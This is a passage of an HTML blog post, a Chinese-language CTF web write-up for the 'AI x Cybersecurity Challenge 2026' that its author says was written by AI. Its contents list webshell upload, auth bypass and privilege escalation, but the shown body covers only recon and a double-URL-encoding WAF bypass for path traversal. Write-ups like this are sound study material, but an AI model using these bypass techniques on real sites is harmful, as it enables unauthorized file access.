@@ -1,0 +1,1474 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>AI X Cybersecurity Challenge 2026 Web Writeup - L1nq Blog</title><meta name="author" content="L1nq">
+<meta name="description" content="AI x Cybersecurity Challenge 2026 Web Writeup"><meta name="keywords" content='CTF'>
+  <meta itemprop="name" content="AI x Cybersecurity Challenge 2026 Web Writeup">
+  <meta itemprop="description" content="AI x Cybersecurity Challenge 2026 Web Writeup">
+  <meta itemprop="datePublished" content="2026-07-05T00:00:00+00:00">
+  <meta itemprop="dateModified" content="2026-07-09T18:20:21+08:00">
+  <meta itemprop="wordCount" content="1927">
+  <meta itemprop="image" content="https://sw1mblu3.fun/1.jpg">
+  <meta itemprop="keywords" content="CTF"><meta property="og:url" content="https://sw1mblu3.fun/posts/ai-cybersecurity-challenge-2026-web-writeup/">
+  <meta property="og:site_name" content="L1nq Blog">
+  <meta property="og:title" content="AI x Cybersecurity Challenge 2026 Web Writeup">
+  <meta property="og:description" content="AI x Cybersecurity Challenge 2026 Web Writeup">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-07-05T00:00:00+00:00">
+    <meta property="article:modified_time" content="2026-07-09T18:20:21+08:00">
+    <meta property="article:tag" content="CTF">
+    <meta property="og:image" content="https://sw1mblu3.fun/1.jpg">
+<meta name="twitter:card" content="summary" /><meta name="twitter:site" content="@L1nq1_" />
+  <meta name="twitter:creator" content="@L1nq1_" /><meta name="twitter:image" content="https://sw1mblu3.fun/1.jpg" /><meta name="twitter:title" content="AI x Cybersecurity Challenge 2026 Web Writeup" /><meta name="twitter:description" content="AI x Cybersecurity Challenge 2026 Web Writeup" /><meta name="application-name" content="L1nq Blog">
+<meta name="apple-mobile-web-app-title" content="L1nq Blog"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="https://sw1mblu3.fun/posts/ai-cybersecurity-challenge-2026-web-writeup/" title="AI x Cybersecurity Challenge 2026 Web Writeup - L1nq Blog" /><link rel="prev" type="text/html" href="https://sw1mblu3.fun/about/" title="About" /><link rel="alternate" type="text/markdown" href="https://sw1mblu3.fun/posts/ai-cybersecurity-challenge-2026-web-writeup/index.md" title="AI x Cybersecurity Challenge 2026 Web Writeup - L1nq Blog"><link rel="stylesheet" href="/css/config.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "AI x Cybersecurity Challenge 2026 Web Writeup",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/sw1mblu3.fun\/posts\/ai-cybersecurity-challenge-2026-web-writeup\/"
+    },"image": ["https:\/\/sw1mblu3.fun\/1.jpg"],"genre": "posts","keywords": "CTF","wordcount":  1927 ,
+    "url": "https:\/\/sw1mblu3.fun\/posts\/ai-cybersecurity-challenge-2026-web-writeup\/","datePublished": "2026-07-05T00:00:00+00:00","dateModified": "2026-07-09T18:20:21+08:00","license": "2026","publisher": {
+      "@type": "Organization",
+      "name": "L1nq Blog","logo": "https:\/\/sw1mblu3.fun\/1.jpg"},"author": {
+        "@type": "Person",
+        "name": "L1nq"
+      },"description": ""
+  }
+  </script><script src="/js/head/color-scheme.min.js"></script><meta name="view-transition" content="same-origin">
+<script>
+(function() {
+  
+  var hasNative = false;
+  try {
+    if (typeof CSS !== 'undefined' && CSS.supports) {
+      hasNative = CSS.supports('selector(::view-transition-old(root))');
+    }
+  } catch(e) {}
+  if (hasNative) return;
+
+  
+  document.addEventListener('click', function(e) {
+    var a = (e.target && e.target.closest) ? e.target.closest('a') : null;
+    if (!a || !a.href) return;
+    var url;
+    try { url = new URL(a.href, location.href); } catch(e) { return; }
+    if (url.origin !== location.origin) return;
+    if (a.target && a.target === '_blank') return;
+    if (a.hasAttribute && a.hasAttribute('download')) return;
+    if (e.metaKey || e.ctrlKey || e.altKey || e.shiftKey) return;
+
+    e.preventDefault();
+    try { sessionStorage.setItem('_vt', '1'); } catch(e) {}
+    document.documentElement.style.opacity = '0';
+    document.documentElement.style.transition = 'opacity 0.12s ease-out';
+    setTimeout(function() { location.href = a.href; }, 120);
+  }, { capture: true });
+
+  
+  try {
+    if (sessionStorage.getItem('_vt') === '1') {
+      sessionStorage.removeItem('_vt');
+      document.documentElement.style.opacity = '0';
+      document.documentElement.style.transition = 'none';
+      requestAnimationFrame(function() {
+        requestAnimationFrame(function() {
+          document.documentElement.style.transition = 'opacity 0.2s ease-in';
+          document.documentElement.style.opacity = '1';
+        });
+      });
+    }
+  } catch(e) {}
+})();
+</script>
+</head>
+  <body data-instant-intensity="viewport" data-header-desktop="sticky" data-header-mobile="auto">
+    <div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="L1nq Blog"><span class="header-title-text">L1nq Blog</span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a class="menu-link" href="/categories/"><i class="fa-solid fa-folder-tree fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
+              <a class="menu-link" href="/links/"><i class="fa-solid fa-link fa-sm" aria-hidden="true"></i> Links</a></li><li class="menu-item">
+              <a class="menu-link" href="/about/"><i class="fa-solid fa-user fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item">
+              <a class="menu-link" href="/archives/"><i class="fa-solid fa-archive fa-sm" aria-hidden="true"></i> Archives</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+              <i class="fa-solid fa-search" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+              <i class="fa-solid fa-times-circle" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" role="button" aria-label="Switch Theme" title="Switch Theme"><i class="fa-solid fa-adjust" aria-hidden="true"></i></li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="L1nq Blog"><span class="header-title-text">L1nq Blog</span></a><span class="header-subtitle"></span></div>
+      <div class="theme-switch" role="button" aria-label="Switch Theme"><i class="fa-solid fa-adjust" aria-hidden="true"></i></div>
+      <div class="menu-toggle" id="menu-toggle-mobile" role="button" aria-labelledby="menu-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                <i class="fa-solid fa-search" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                <i class="fa-solid fa-times-circle" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              Cancel
+            </a>
+          </li><li class="menu-item"><a class="menu-link" href="/categories/"><i class="fa-solid fa-folder-tree fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item"><a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item"><a class="menu-link" href="/links/"><i class="fa-solid fa-link fa-sm" aria-hidden="true"></i> Links</a></li><li class="menu-item"><a class="menu-link" href="/about/"><i class="fa-solid fa-user fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item"><a class="menu-link" href="/archives/"><i class="fa-solid fa-archive fa-sm" aria-hidden="true"></i> Archives</a></li><li class="menu-item menu-system"></li>
+      </ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><main class="fi-container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>AI X Cybersecurity Challenge 2026 Web Writeup</span>
+      </h1></div><div class="post-meta">
+      <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="meta-calendar-icon">
+        <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+        <path d="M4 7a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v12a2 2 0 0 1 -2 2h-12a2 2 0 0 1 -2 -2v-12z"/>
+        <path d="M16 3v4"/><path d="M8 3v4"/><path d="M4 11h16"/>
+        <path d="M7 14h.013"/><path d="M10.01 14h.005"/><path d="M13.01 14h.005"/><path d="M16.015 14h.005"/>
+        <path d="M13.015 17h.005"/><path d="M7.01 17h.005"/><path d="M10.01 17h.005"/>
+      </svg><time datetime="2026-07-05T00:00:00Z">5 Jul, 2026</time><span aria-hidden="true">|</span>
+        <a href="true" target="_blank" rel="noopener noreferrer">Edit this page</a></div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#info2exploit">Info2Exploit</a>
+      <ul>
+        <li><a href="#信息收集">信息收集</a></li>
+        <li><a href="#端点枚举">端点枚举</a>
+          <ul>
+            <li><a href="#隐藏文档发现">隐藏文档发现</a></li>
+            <li><a href="#线索关键词收集">线索关键词收集</a></li>
+          </ul>
+        </li>
+        <li><a href="#漏洞分析">漏洞分析</a>
+          <ul>
+            <li><a href="#waf-绕过双重-url-编码">WAF 绕过：双重 URL 编码</a></li>
+            <li><a href="#scope-check存储范围限制">Scope Check：存储范围限制</a></li>
+          </ul>
+        </li>
+        <li><a href="#路径发现逐层关键词试探">路径发现：逐层关键词试探</a>
+          <ul>
+            <li><a href="#第一层目录--试探-private">第一层目录 —— 试探 <code>../private</code></a></li>
+            <li><a href="#第二层目录--在-private-下试探隐藏目录">第二层目录 —— 在 <code>../private/</code> 下试探隐藏目录</a></li>
+            <li><a href="#读取目标文件">读取目标文件</a></li>
+            <li><a href="#额外发现分号参数注入">额外发现：分号参数注入</a></li>
+          </ul>
+        </li>
+        <li><a href="#漏洞利用">漏洞利用</a>
+          <ul>
+            <li><a href="#payload">Payload</a></li>
+            <li><a href="#请求处理流程">请求处理流程</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#picklejail">PickleJail</a>
+      <ul>
+        <li><a href="#源码审计">源码审计</a>
+          <ul>
+            <li><a href="#路径穿越获取源码">路径穿越获取源码</a></li>
+            <li><a href="#认证模块-userspy">认证模块 (Users.py)</a></li>
+            <li><a href="#waf-wafpy">WAF (waf.py)</a></li>
+          </ul>
+        </li>
+        <li><a href="#认证绕过">认证绕过</a>
+          <ul>
+            <li><a href="#bcrypt-null-byte-截断">bcrypt Null-Byte 截断</a></li>
+          </ul>
+        </li>
+        <li><a href="#代码执行绕过-60b-waf">代码执行（绕过 60B WAF）</a>
+          <ul>
+            <li><a href="#py-文件导入法">.py 文件导入法</a></li>
+            <li><a href="#waf-子串绕过">WAF 子串绕过</a></li>
+            <li><a href="#模块名长度约束">模块名长度约束</a></li>
+            <li><a href="#追加模式突破-34-字符限制">追加模式突破 34 字符限制</a></li>
+          </ul>
+        </li>
+        <li><a href="#信息收集-1">信息收集</a>
+          <ul>
+            <li><a href="#环境信息">环境信息</a></li>
+            <li><a href="#flag-文件">/flag 文件</a></li>
+            <li><a href="#suid-二进制">SUID 二进制</a></li>
+            <li><a href="#cron-任务">Cron 任务</a></li>
+          </ul>
+        </li>
+        <li><a href="#提权">提权</a>
+          <ul>
+            <li><a href="#sudo--l">sudo -l</a></li>
+            <li><a href="#构造恶意脚本">构造恶意脚本</a></li>
+            <li><a href="#cron-执行">Cron 执行</a></li>
+            <li><a href="#读取-flag">读取 Flag</a></li>
+          </ul>
+        </li>
+        <li><a href="#exploit">Exploit</a></li>
+        <li><a href="#攻击链总结">攻击链总结</a></li>
+      </ul>
+    </li>
+    <li><a href="#malcraft">MalCraft</a>
+      <ul>
+        <li><a href="#初始侦察">初始侦察</a>
+          <ul>
+            <li><a href="#端点枚举-1">端点枚举</a></li>
+            <li><a href="#上传防护测试">上传防护测试</a></li>
+            <li><a href="#downloadphp-路径穿越测试">download.php 路径穿越测试</a></li>
+          </ul>
+        </li>
+        <li><a href="#源码审计-1">源码审计</a>
+          <ul>
+            <li><a href="#check_extension--扩展名校验">check_extension() — 扩展名校验</a></li>
+            <li><a href="#ai_security_check--ai-内容检测">ai_security_check() — AI 内容检测</a></li>
+            <li><a href="#downloadphp--文件下载">download.php — 文件下载</a></li>
+            <li><a href="#apache-配置">Apache 配置</a></li>
+          </ul>
+        </li>
+        <li><a href="#上传绕过">上传绕过</a>
+          <ul>
+            <li><a href="#htaccess-上传">.htaccess 上传</a></li>
+            <li><a href="#webshell-上传">webshell 上传</a></li>
+            <li><a href="#rce-验证">RCE 验证</a></li>
+          </ul>
+        </li>
+        <li><a href="#后渗透枚举">后渗透枚举</a>
+          <ul>
+            <li><a href="#db_backupconf">db_backup.conf</a></li>
+            <li><a href="#hash_record">.hash_record</a></li>
+          </ul>
+        </li>
+        <li><a href="#解密日志备份">解密日志备份</a></li>
+        <li><a href="#证据提取">证据提取</a></li>
+        <li><a href="#攻击链">攻击链</a></li>
+      </ul>
+    </li>
+    <li><a href="#prompt-vault">Prompt Vault</a>
+      <ul>
+        <li><a href="#题目信息">题目信息</a></li>
+        <li><a href="#页面分析">页面分析</a></li>
+        <li><a href="#枚举公开片段">枚举公开片段</a></li>
+        <li><a href="#发现隐藏接口">发现隐藏接口</a></li>
+        <li><a href="#渲染内部片段">渲染内部片段</a></li>
+        <li><a href="#一行命令提取-flag">一行命令提取 Flag</a></li>
+      </ul>
+    </li>
+    <li><a href="#chamber">Chamber</a></li>
+    <li><a href="#poichain">PoiChain</a></li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><p>结赛排名 27，比赛前二十才进，竞争太激烈了。</p>
+<p>采用 AI 半自动化协同解题，这次没有跑全自动，半自动下人为不停纠正和阅读输出质量，非常消耗体力。这次 WEB 共六题，全部为黑盒，我采用边打边维护信息面文档，但并不是那么好用，有时候还会误导 AI，由于并没有 AI 全自动化框架，比其他选手抢分秒题还是太慢了，但较于人工古法还是快了很多。大模型使用 deepseek-v4-pro，体验上能力合格。这次抢分太慢。</p>
+<p>以下 Writeup 内容均由 AI 完成。</p>
+<h1 class="heading-element" id="info2exploit"><span>Info2Exploit</span>
+  <a href="#info2exploit" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h1><h2 class="heading-element" id="信息收集"><span>信息收集</span>
+  <a href="#%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><h2 class="heading-element" id="端点枚举"><span>端点枚举</span>
+  <a href="#%e7%ab%af%e7%82%b9%e6%9e%9a%e4%b8%be" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>访问目标站点，发现以下页面：</p>
+<div class="table-wrapper">
+  <table>
+    <thead>
+        <tr>
+            <th>路径</th>
+            <th>功能</th>
+        </tr>
+    </thead>
+    <tbody>
+        <tr>
+            <td><code>GET /</code></td>
+            <td>首页，展示 3 篇公开文章</td>
+        </tr>
+        <tr>
+            <td><code>GET /about</code></td>
+            <td>架构说明，泄露组件和版本信息</td>
+        </tr>
+        <tr>
+            <td><code>GET /repo</code></td>
+            <td>Git 仓库页，提示 &ldquo;Private Protection&rdquo; 模式</td>
+        </tr>
+        <tr>
+            <td><code>GET /search?q=</code></td>
+            <td>全文搜索</td>
+        </tr>
+        <tr>
+            <td><code>GET /article?id=</code></td>
+            <td>文章阅读器 —— 核心攻击面</td>
+        </tr>
+    </tbody>
+  </table>
+</div><p><code>/about</code> 页面关键信息：</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">Server: Werkzeug/3.1.8 Python/3.9.25
+</span></span><span class="line"><span class="cl">Custom HTTP Parser (C++) with URL decoding
+</span></span><span class="line"><span class="cl">HyperGuard WAF 3.1.0</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><code>/repo</code> 页面关键信息：</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">System Alert: This warehouse is currently in &#34;Private Protection&#34; mode.
+</span></span><span class="line"><span class="cl">Recent maintenance records mention an archived migration note
+</span></span><span class="line"><span class="cl">that is no longer listed on the portal.</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><h3 class="heading-element" id="隐藏文档发现"><span>隐藏文档发现</span>
+  <a href="#%e9%9a%90%e8%97%8f%e6%96%87%e6%a1%a3%e5%8f%91%e7%8e%b0" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>通过 <code>/search?q=migration</code> 发现第 4 篇隐藏文档 <code>_ops_snapshot_notice.md</code>：</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="2" style="--fi-max-shown-lines:30;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl"># Archived Migration Note
+</span></span><span class="line"><span class="cl">A maintenance record from the previous storage migration was retained
+</span></span><span class="line"><span class="cl">in the archive set after the public index was rebuilt.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">The internal package label `node_flag.txt` was kept during that migration,
+</span></span><span class="line"><span class="cl">and the archived note still references the old hidden snapshot namespace
+</span></span><span class="line"><span class="cl">used by the storage service.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Some legacy sync clients also replay archived requests using
+</span></span><span class="line"><span class="cl">older encoding behavior during fallback.</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><h3 class="heading-element" id="线索关键词收集"><span>线索关键词收集</span>
+  <a href="#%e7%ba%bf%e7%b4%a2%e5%85%b3%e9%94%ae%e8%af%8d%e6%94%b6%e9%9b%86" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>从各页面提取可能用作路径组件的关键词：</p>
+<div class="table-wrapper">
+  <table>
+    <thead>
+        <tr>
+            <th>来源</th>
+            <th>原文</th>
+            <th>关键词</th>
+        </tr>
+    </thead>
+    <tbody>
+        <tr>
+            <td><code>/repo</code></td>
+            <td>&ldquo;Private Protection&rdquo; mode</td>
+            <td><code>private</code></td>
+        </tr>
+        <tr>
+            <td><code>_ops_snapshot_notice.md</code></td>
+            <td>&ldquo;old hidden snapshot namespace&rdquo;</td>
+            <td><code>snapshot</code>, <code>.snapshot</code> (hidden→dot prefix)</td>
+        </tr>
+        <tr>
+            <td><code>_ops_snapshot_notice.md</code></td>
+            <td>&ldquo;archive set&rdquo;</td>
+            <td><code>archive</code>, <code>.archive</code></td>
+        </tr>
+        <tr>
+            <td><code>_ops_snapshot_notice.md</code></td>
+            <td>&ldquo;internal package label <code>node_flag.txt</code>&rdquo;</td>
+            <td><code>node_flag.txt</code></td>
+        </tr>
+        <tr>
+            <td><code>_ops_snapshot_notice.md</code></td>
+            <td>&ldquo;storage migration&rdquo;</td>
+            <td><code>migration</code></td>
+        </tr>
+        <tr>
+            <td><code>/about</code></td>
+            <td>架构信息</td>
+            <td>确认 WAF + 双解码绕过方向</td>
+        </tr>
+    </tbody>
+  </table>
+</div><h2 class="heading-element" id="漏洞分析"><span>漏洞分析</span>
+  <a href="#%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><h3 class="heading-element" id="waf-绕过双重-url-编码"><span>WAF 绕过：双重 URL 编码</span>
+  <a href="#waf-%e7%bb%95%e8%bf%87%e5%8f%8c%e9%87%8d-url-%e7%bc%96%e7%a0%81" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>请求经过两层 URL 解码——自定义 C++ HTTP 解析器在 WAF 之前解码一次，Werkzeug 在 WAF 之后解码第二次：</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">%252F  →  C++ 解析器第1次解码  →  %2F  →  WAF 检查（字面 %2F，不触发规则）→  PASS
